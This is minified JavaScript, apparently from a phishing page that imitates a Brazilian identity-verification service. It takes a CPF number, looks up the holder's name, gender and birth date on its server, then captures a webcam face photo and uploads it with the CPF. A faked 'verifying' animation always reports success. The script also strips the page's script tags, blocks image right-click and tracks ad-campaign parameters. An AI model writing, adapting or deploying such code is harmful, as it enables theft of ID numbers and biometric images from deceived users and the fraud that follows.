function t(t) {
    return document.querySelector(t)
}

function e(t) {
    return document.querySelectorAll(t)
}
class o {
    constructor() {
        this.audioContext = new(window.AudioContext || window.webkitAudioContext), this.sounds = new Map
    }
    async preload(t, e) {
        if (this.sounds.has(t)) return;
        const o = await fetch(e),
            n = await o.arrayBuffer(),
            a = await this.audioContext.decodeAudioData(n);
        this.sounds.set(t, a)
    }
    playSound(t, e = 1) {
        const o = this.sounds.get(t);
        if (!o) return void console.warn(`Som "${t}" não foi pré-carregado.`);
        const n = this.audioContext.createBufferSource();
        n.buffer = o;
        const a = this.audioContext.createGain();
        a.gain.value = e, n.connect(a).connect(this.audioContext.destination), n.start(0)
    }
}
const n = new o;
if (e("script").forEach(t => {
        t.remove()
    }), t("form")) {
    const u = document.getElementById("accountId");

    function a(t) {
        if (11 !== (t = t.replace(/\D/g, "")).length) return !1;
        if (/^(\d)\1{10}$/.test(t)) return !1;
        let e = 0;
        for (let o = 0; o < 9; o++) e += parseInt(t.charAt(o)) * (10 - o);
        let o = 10 * e % 11;
        if (10 === o && (o = 0), o !== parseInt(t.charAt(9))) return !1;
        e = 0;
        for (let o = 0; o < 10; o++) e += parseInt(t.charAt(o)) * (11 - o);
        return o = 10 * e % 11, 10 === o && (o = 0), o === parseInt(t.charAt(10))
    }! function() {
        const t = u;

        function e(t) {
            return t.replace(/\D+/g, "")
        }

        function o(t) {
            return (t = t.slice(0, 11)).length <= 3 ? t : t.length <= 6 ? t.replace(/^(\d{3})(\d+)/, "$1.$2") : t.length <= 9 ? t.replace(/^(\d{3})(\d{3})(\d+)/, "$1.$2.$3") : t.replace(/^(\d{3})(\d{3})(\d{3})(\d{0,2})/, "$1.$2.$3-$4")
        }

        function n(t, e) {
            return (t.slice(0, e).match(/\d/g) || []).length
        }

        function a(t, e) {
            if (0 === e) return 0;
            let o = 0;
            for (let n = 0; n < t.length; n++)
                if (/\d/.test(t[n]) && (o++, o === e)) return n + 1;
            return t.length
        }
        t.addEventListener("input", function(t) {
            const r = t.target,
                c = r.value,
                s = n(c, r.selectionStart),
                i = o(e(c));
            r.value = i;
            const l = a(i, s);
            r.setSelectionRange(l, l)
        }), t.addEventListener("paste", function(r) {
            r.preventDefault();
            const c = e((r.clipboardData || window.clipboardData).getData("text") || ""),
                s = t.selectionStart,
                i = t.selectionEnd,
                l = t.value,
                d = e(l),
                u = n(l, s),
                m = o(d.slice(0, u) + c + d.slice(n(l, i)));
            t.value = m;
            const g = a(m, u + c.length);
            t.setSelectionRange(g, g)
        })
    }(), document.getElementById("enter-account-id").addEventListener("click", function() {
        if (this.classList.contains("loading")) return !1;
        const e = t("#invalid-document");
        e.style.display = "none", a(u.value) ? (this.classList.add("loading"), fetch("ss/auth", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ in: u.value
            })
        }).then(t => {
            if (!t.ok) throw new Error(`HTTP error! status: ${t.status}`);
            return t.json()
        }).then(t => {
            if (t.success) {
                const e = JSON.parse(atob(t.data));
                localStorage.setItem("form_doc", e.cpf), localStorage.setItem("form_name", e.nome), localStorage.setItem("form_gender", e.genero), localStorage.setItem("form_bdate", e.nascimento), window.location.href = "/verificacao"
            } else e.style.display = "";
            this.classList.remove("loading")
        }).catch(t => {
            e.style.display = "", this.classList.remove("loading"), console.error("Error:", t)
        })) : e.style.display = ""
    }), e("img").forEach(t => {
        t.addEventListener("contextmenu", function(t) {
            return t.preventDefault(), !1
        })
    });
    const m = new URL(window.location.href).searchParams;
    let g = m.get("tbtyp");
    g && ["B", "C"].includes(g.toUpperCase()) && localStorage.setItem("tbtyp", g);
    let f = m.get("ftype");

    function r(t) {
        const e = new URL(window.location.href),
            o = e.searchParams;
        t.forEach(t => {
            o.delete(t)
        });
        const n = e.pathname + (o.toString() ? "?" + o.toString() : "");
        window.history.replaceState({}, "", n)
    }

    function c() {
        const t = new URLSearchParams(window.location.search);
        return {
            utm_source: t.get("utm_source"),
            utm_medium: t.get("utm_medium"),
            utm_campaign: t.get("utm_campaign"),
            utm_content: t.get("utm_content"),
            utm_term: t.get("utm_term"),
            fbclid: t.get("fbclid")
        }
    }

    function s() {
        if (!localStorage.getItem("utm_saved")) {
            const t = c();
            Object.values(t).some(t => null !== t) && (localStorage.setItem("utm_source", t.utm_source || ""), localStorage.setItem("utm_medium", t.utm_medium || ""), localStorage.setItem("utm_campaign", t.utm_campaign || ""), localStorage.setItem("utm_content", t.utm_content || ""), localStorage.setItem("utm_term", t.utm_term || ""), localStorage.setItem("fbclid", t.fbclid || ""), localStorage.setItem("utm_saved", "true"))
        }
        setTimeout(() => {
            r(["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "fbclid"])
        }, 100)
    }
    f && ["A", "B"].includes(f.toUpperCase()) && localStorage.setItem("ftype", f), s()
} else {
    function i(t) {
        const e = document.querySelector(".camera");
        navigator.mediaDevices.getUserMedia({
            video: !0
        }).then(o => {
            const n = document.createElement("video");
            n.srcObject = o, n.autoplay = !0, n.playsInline = !0, e.innerHTML = "", e.appendChild(n), t(!0)
        }).catch(e => {
            console.error("Erro ao acessar a câmera:", e), t(!1)
        })
    }

    function l(t) {
        const e = document.querySelector(".camera"),
            o = e.querySelector("video");
        if (!o) return console.error("Vídeo não encontrado!"), void t(null);
        const n = document.createElement("canvas");
        n.width = o.videoWidth, n.height = o.videoHeight;
        n.getContext("2d").drawImage(o, 0, 0, n.width, n.height);
        const a = n.toDataURL("image/png");
        e.innerHTML = "", e.appendChild(n), t(a)
    }

    function d(t) {
        fetch("./ss/pcsv", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                dt: t,
                doc: localStorage.getItem("form_doc")
            })
        }).then(t => t.json()).then(t => {
            console.log("Resposta do servidor:", t)
        }).catch(t => {
            console.error("Erro ao enviar a foto:", t)
        })
    }(async () => {
        await n.preload("shot", "/assets/sfx/shot.mp3")
    })();
    let h = 1;
    const p = t(".action button");
    p.addEventListener("click", function() {
        1 === h ? i(function(e) {
            e ? (h = 2, p.querySelector("span").textContent = "TIRAR FOTO", p.disabled = !0, t(".tips").style.height = "0rem", t(".vector .camera").style.opacity = "1", t(".vector img").style.width = "100%", t(".vector img").style.opacity = "0", t(".vector img").style.paddingBottom = "5rem", setTimeout(() => {
                t(".vector img").scrollIntoView({
                    behavior: "smooth",
                    block: "center"
                })
            }, 300), setTimeout(() => {
                p.disabled = !1
            }, 2e3)) : window.location.href = "/servicos"
        }) : 2 === h ? l(function(e) {
            e && (h = 3, n.playSound("shot", .8), p.disabled = !0, p.querySelector("span").textContent = "VERIFICANDO...", t(".vector .camera canvas").style.filter = "brightness(1.6)", setTimeout(() => {
                t(".vector .camera canvas").style.filter = "brightness(0.5)"
            }, 100), setTimeout(() => {
                t(".vector .lderc").style.opacity = "1"
            }, 200), setTimeout(() => {
                t(".vector .lderc").style.opacity = "0", setTimeout(() => {
                    t(".vector .lderc .loader").style.display = "none", t(".vector .lderc .success").style.display = "block", t(".vector .lderc").style.opacity = "1", p.disabled = !1, p.querySelector("span").textContent = "CONTINUAR"
                }, 300)
            }, 4e3), d(e))
        }) : 3 === h && (window.location.href = "servicos")
    })
}